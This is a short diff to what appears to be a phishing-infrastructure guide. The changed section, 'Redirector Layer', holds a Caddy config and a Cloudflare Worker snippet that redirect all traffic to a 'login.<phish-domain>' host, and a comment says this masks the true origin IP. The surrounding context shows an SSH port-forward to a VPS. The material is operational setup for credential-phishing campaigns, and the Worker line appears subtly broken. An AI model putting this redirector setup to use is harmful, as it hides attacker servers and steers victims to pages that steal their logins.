@@ -199,12 +199,14 @@ ssh -L 3333:127.0.0.1:3333 user@vps
 
 ### 2.5 Redirector Layer
 
-```bash
+```caddy
 # Caddy as redirector (masks true origin IP via Cloudflare-style DNS proxy)
 :80, :443 {
   redir https://login.<phish-domain>{uri} 302
 }
+```
 
+```javascript
 # Or: Cloudflare Workers
 addEventListener('fetch', e => {
   e.respondWith(Response.redirect('https://login.<phish-domain>' + e.request.url, 302))
